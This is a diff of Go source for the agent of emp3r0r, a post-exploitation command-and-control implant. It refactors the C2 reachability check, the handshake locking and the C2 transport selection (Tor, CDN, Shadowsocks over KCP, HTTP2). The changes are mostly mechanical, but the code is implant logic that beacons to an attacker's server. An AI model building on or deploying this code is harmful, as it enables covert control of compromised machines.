@@ -4,7 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -69,7 +69,7 @@ func IsCCOnline(proxy string) bool {
 		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
 		return false
 	}
-	data, err := ioutil.ReadAll(resp.Body)
+	data, err := io.ReadAll(resp.Body)
 	if err != nil {
 		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
 		return false
@@ -200,7 +200,10 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		// wait until timeout or success
 		for i := 0; i < RuntimeConfig.Timeout; i++ {
 			// if hello marked as success, return true
-			if HandShakes[hello] {
+			HandShakesMutex.RLock()
+			isSuccess := HandShakes[hello]
+			HandShakesMutex.RUnlock()
+			if isSuccess {
 				log.Printf("Hello (%s) done", hello)
 				return true
 			}
@@ -249,7 +252,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		if err != nil {
 			log.Printf("Updating agent sysinfo: %v", err)
 		}
-		if !util.IsFileExist(RuntimeConfig.UtilsPath + "/python") {
+		if !util.IsExist(RuntimeConfig.UtilsPath + "/python") {
 			if runtime.GOOS == "linux" {
 				go VaccineHandler()
 			}
@@ -267,18 +270,18 @@ func setC2Transport() {
 	if tun.IsTor(emp3r0r_data.CCAddress) {
 		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
 		return
-	}
-	if RuntimeConfig.CDNProxy != "" {
+	} else if RuntimeConfig.CDNProxy != "" {
 		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
 		return
-	}
-
-	if RuntimeConfig.UseShadowsocks {
-		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", RuntimeConfig.ShadowsocksPort)
+	} else if RuntimeConfig.UseShadowsocks {
+		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) to %s",
+			RuntimeConfig.ShadowsocksPort, emp3r0r_data.CCAddress)
 		// ss thru KCP
 		if RuntimeConfig.UseKCP {
-			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
-				RuntimeConfig.ShadowsocksPort, RuntimeConfig.KCPPort)
+			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s) to %s",
+				RuntimeConfig.ShadowsocksPort, RuntimeConfig.KCPPort, emp3r0r_data.CCAddress)
 		}
+	} else {
+		emp3r0r_data.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_data.CCAddress)
 	}
 }
